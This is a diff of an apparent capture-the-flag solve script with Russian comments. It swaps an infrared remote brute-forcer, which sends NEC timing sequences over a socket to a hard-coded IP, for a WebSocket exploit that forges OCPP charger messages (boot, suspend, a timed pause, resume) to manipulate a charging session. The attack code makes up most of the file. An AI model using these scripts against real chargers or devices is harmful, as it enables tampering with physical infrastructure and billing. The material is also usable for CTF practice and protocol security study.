@@ -162,84 +162,45 @@ def brute_force():
 if __name__ == "__main__":
     brute_force()
 
-import socket
-import requests
+import asyncio
+import websockets
 import json
-import time
 
-# Данные с твоего скриншота
-HOST = "154.57.164.72"
-IR_PORT = 30241
-STATE_URL = f"http://{HOST}:32567/state"
-
-def generate_nec_timings(address, command):
-    timings = [9000, 4500] 
+async def exploit():
+    uri = "ws://154.57.164.82:30129/Monastiraki"
     
-    data = [
-        address,
-        address ^ 0xFF,
-        command,
-        command ^ 0xFF
-    ]
-    
-    for byte in data:
-        for i in range(8):
-            bit = (byte >> i) & 1
-            if bit == 0:
-                timings.extend([560, 560])
-            else:
-                timings.extend([560, 1690])
-                
-    timings.append(560)
-    return timings
-
-def main():
-    print(f"Начинаем перебор для {HOST}...")
-    
-    # Перебираем возможные адреса устройств
-    for address in [0x00, 0x04, 0x08, 0xFF]:
-        print(f"\nПробуем адрес устройства: {hex(address)}")
+    print("1. Подключаемся к сокету...")
+    async with websockets.connect(uri) as websocket:
         
-        for cmd in range(256):
-            timings = generate_nec_timings(address, cmd)
-            
-            # Вариант 1: Отправка как JSON массив (самый частый для CTF)
-            payload = json.dumps(timings) + "\n"
-            
-            # Вариант 2: Строка через пробел (раскомментируй, если JSON не сработает)
-            # payload = " ".join(map(str, timings)) + "\n"
-            
-            # Вариант 3: Строка через запятую (раскомментируй, если предыдущие не сработают)
-            # payload = ",".join(map(str, timings)) + "\n"
+        # Авторизуем станцию
+        boot_msg = [2, "msg-1", "BootNotification", {"chargePointVendor": "VoltGrid", "chargePointModel": "V1"}]
+        await websocket.send(json.dumps(boot_msg))
+        print(f"<- {await websocket.recv()}")
 
+        # Останавливаем транзакцию
+        print("2. Отправляем SuspendedEVSE...")
+        suspend_msg = [2, "msg-2", "StatusNotification", {"connectorId": 1, "errorCode": "NoError", "status": "SuspendedEVSE"}]
+        await websocket.send(json.dumps(suspend_msg))
+        print(f"<- {await websocket.recv()}")
+
+        # Идеальный тайминг
+        print("3. Ждем ровно 60 секунд...")
+        await asyncio.sleep(60)
+
+        # Возобновляем
+        print("4. Возвращаем статус Charging...")
+        charge_msg = [2, "msg-3", "StatusNotification", {"connectorId": 1, "errorCode": "NoError", "status": "Charging"}]
+        await websocket.send(json.dumps(charge_msg))
+        
+        # Слушаем ответы в поисках флага
+        print("5. Ожидаем флаг...")
+        while True:
             try:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.settimeout(2)
-                    s.connect((HOST, IR_PORT))
-                    s.sendall(payload.encode())
-                    
-                # Пауза, чтобы эмулятор успел обработать ИК-сигнал
-                time.sleep(0.15) 
-                
-                resp = requests.get(STATE_URL, timeout=2)
-                if resp.status_code == 200:
-                    state = resp.json()
-                    
-                    # Выводим прогресс раз в 16 команд, чтобы не засорять консоль
-                    if cmd % 16 == 0:
-                        print(f"Текущая команда {hex(cmd)}. Вход: {state.get('input_name')} / Канал: {state.get('channel')}")
-                    
-                    # Проверяем, изменилось ли состояние по сравнению с дефолтным
-                    if state.get('input_name') != "TV" or state.get('channel') != 1:
-                        print(f"\n[+] УСПЕХ! Состояние изменилось!")
-                        print(f"[+] Адрес: {hex(address)}, Команда: {hex(cmd)}")
-                        print(f"[+] Новый стейт: {state}")
-                        print("Проверь экран в браузере, там должен появиться флаг.")
-                        return
-                        
-            except Exception as e:
-                print(f"[!] Ошибка отправки на адресе {hex(address)}, команде {hex(cmd)}: {e}")
-                time.sleep(0.5)
+                response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
+                print(f"<- {response}")
+            except asyncio.TimeoutError:
+                print("Таймаут ожидания ответа. Проверь вывод выше.")
+                break
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(exploit())
